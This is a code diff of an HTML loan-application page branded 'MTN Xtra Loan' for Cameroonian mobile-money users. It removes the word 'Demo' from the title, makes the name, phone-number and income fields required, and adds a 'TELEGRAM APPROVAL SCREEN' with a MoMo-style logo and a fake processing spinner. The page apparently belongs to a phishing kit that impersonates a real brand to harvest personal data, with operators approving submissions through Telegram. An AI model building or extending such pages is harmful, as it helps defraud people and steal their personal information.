@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN Xtra Loan Demo</title>
+    <title>MTN Xtra Loan</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 </head>
@@ -34,12 +34,14 @@
             <div class="calculator">
                 <h4>Loan Calculator</h4>
                 <label>Amount (XAF)</label>
-                <input type="range" id="amount-slider" min="500000" max="5000000" step="100000" value="1000000">
-                <div class="slider-labels"><span>500k</span><span>5M</span></div>
-                <div class="calc-display">XAF <span id="loan-amount-display">1,000,000</span></div>
+                <input type="range" id="amount-slider" min="5000" max="2000000" step="5000" value="100000">
+                <div class="slider-labels"><span>5,000</span><span>2,000,000</span></div>
+                <div class="calc-display">XAF <span id="loan-amount-display">100,000</span></div>
 
                 <label>Term</label>
                 <select id="term-select">
+                    <option value="3">3 Months</option>
+                    <option value="6">6 Months</option>
                     <option value="12">12 Months</option>
                     <option value="24">24 Months</option>
                     <option value="36">36 Months</option>
@@ -48,7 +50,7 @@
 
                 <div class="monthly-payment">
                     <p>Monthly Payment</p>
-                    <h2>XAF <span id="monthly-payment-display">20,834</span></h2>
+                    <h2>XAF <span id="monthly-payment-display">2,292</span></h2>
                 </div>
             </div>
 
@@ -56,7 +58,7 @@
         </div>
     </div>
 
-    <!-- APPLICATION FORM SCREEN (3 STEPS) -->
+    <!-- APPLICATION FORM SCREEN -->
     <div id="screen-application" class="screen">
         <header>
             <h1>MTN Xtra Loan</h1>
@@ -69,11 +71,12 @@
                 <p id="step-indicator">Step 1 of 3</p>
             </div>
 
-            <form id="loan-form" onsubmit="submitForm(event)">
+            <form id="loan-form" onsubmit="submitForm(event)" novalidate>
                 <!-- STEP 1 -->
                 <div id="step-1" class="form-step active">
                     <label>Loan Type</label>
-                    <select id="loan-type">
+                    <select id="loan-type" required>
+                        <option value="" disabled selected>Select Loan Type</option>
                         <option>Business Loan</option>
                         <option>Personal Loan</option>
                         <option>Emergency Loan</option>
@@ -81,10 +84,12 @@
                     </select>
 
                     <label>Loan Amount (XAF)</label>
-                    <input type="number" id="form-amount" value="1000000" min="500000" max="5000000">
+                    <input type="number" id="form-amount" value="100000" min="5000" max="2000000" required>
 
                     <label>Loan Term</label>
-                    <select id="form-term">
+                    <select id="form-term" required>
+                        <option value="3">3 Months</option>
+                        <option value="6">6 Months</option>
                         <option value="12">12 Months</option>
                         <option value="24">24 Months</option>
                         <option value="36">36 Months</option>
@@ -92,21 +97,21 @@
                     </select>
 
                     <label>Purpose of Loan</label>
-                    <input type="text" id="form-purpose" placeholder="e.g., Business expansion">
+                    <input type="text" id="form-purpose" placeholder="e.g., Business expansion" required>
                 </div>
 
                 <!-- STEP 2 -->
                 <div id="step-2" class="form-step">
                     <label>First Name</label>
-                    <input type="text" id="first-name" placeholder="John">
+                    <input type="text" id="first-name" placeholder="John" required>
 
                     <label>Last Name</label>
-                    <input type="text" id="last-name" placeholder="Doe">
+                    <input type="text" id="last-name" placeholder="Doe" required>
 
                     <label>Phone Number (Cameroon)</label>
                     <div class="phone-input">
                         <span>+237</span>
-                        <input type="tel" id="phone-number" placeholder="670123456" pattern="[0-9]{9}" title="9 digits without +237 prefix">
+                        <input type="text" id="phone-number" placeholder="670123456" maxlength="9" minlength="9" pattern="\d{9}" title="Exactly 9 digits (numbers only)" required>
                     </div>
                     <small>9 digits without +237 prefix (e.g., 670123456)</small>
                 </div>
@@ -114,7 +119,8 @@
                 <!-- STEP 3 -->
                 <div id="step-3" class="form-step">
                     <label>Employment Status</label>
-                    <select id="employment-status">
+                    <select id="employment-status" required>
+                        <option value="" disabled selected>Select Employment Status</option>
                         <option>Self-employed</option>
                         <option>Employed full-time</option>
                         <option>Employed part-time</option>
@@ -123,12 +129,12 @@
                     </select>
 
                     <label>Annual Income (XAF)</label>
-                    <input type="number" id="annual-income" placeholder="e.g., 5000000">
+                    <input type="number" id="annual-income" placeholder="e.g., 5000000" required>
 
                     <div class="summary-box">
                         <h4>Application Summary</h4>
-                        <p>Loan Amount: <span id="summary-amount">XAF 1,000,000</span></p>
-                        <p>Loan Term: <span id="summary-term">48 Months</span></p>
+                        <p>Loan Amount: <span id="summary-amount">—</span></p>
+                        <p>Loan Term: <span id="summary-term">—</span></p>
                         <p>Purpose: <span id="summary-purpose">—</span></p>
                         <p>Applicant: <span id="summary-name">—</span></p>
                     </div>
@@ -144,14 +150,30 @@
         </div>
     </div>
 
+    <!-- PROCESSING / TELEGRAM APPROVAL SCREEN -->
+    <div id="screen-processing" class="screen processing-bg">
+        <div class="processing-content">
+            <div class="momo-logo">
+                <svg width="80" height="80" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="100" rx="20" fill="#005B82"/>
+                    <path d="M30 70L45 45H55L70 70" stroke="#FFCC00" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M35 60H65" stroke="#FFCC00" stroke-width="6" stroke-linecap="round"/>
+                </svg>
+            </div>
+            
+            <div class="spinner"></div>
+            
+            <h2>Processing Application</h2>
+            <p>Please wait, this may take a few seconds</p>
+            <div class="dots">...</div>
+        </div>
+    </div>
+
     <!-- SUCCESS SCREEN -->
     <div id="screen-success" class="screen">
         <div class="content-card text-center">
-            <h2>Processing Application</h2>
-            <p>Please wait, this may take a few seconds</p>
-            <div class="spinner"></div>
-            <h3 style="margin-top: 20px; color: #ffcc00;">Success!</h3>
-            <p>Your application has been received.</p>
+            <h2>Success!</h2>
+            <p>Your loan application has been fully submitted and is being reviewed.</p>
         </div>
     </div>
 
